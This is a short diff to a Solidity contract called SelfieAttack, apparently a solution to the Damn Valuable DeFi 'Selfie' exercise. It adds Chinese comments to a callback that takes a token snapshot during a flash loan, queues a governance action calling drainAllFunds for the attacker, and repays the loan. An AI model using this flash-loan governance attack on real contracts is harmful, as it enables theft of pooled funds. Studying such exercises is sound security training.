@@ -25,13 +25,14 @@ contract SelfieAttack {
   }
 
   function receiveTokens(address _token, uint _amount) public {
+    // 构造data
     bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
-
+    // 执行快照
     DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
     token.snapshot();
-
+    // 创建 action
     actionId = governance.queueAction(address(pool), data, 0);
-
+    // 返还token
     token.transfer(address(pool), _amount);
   }
 }
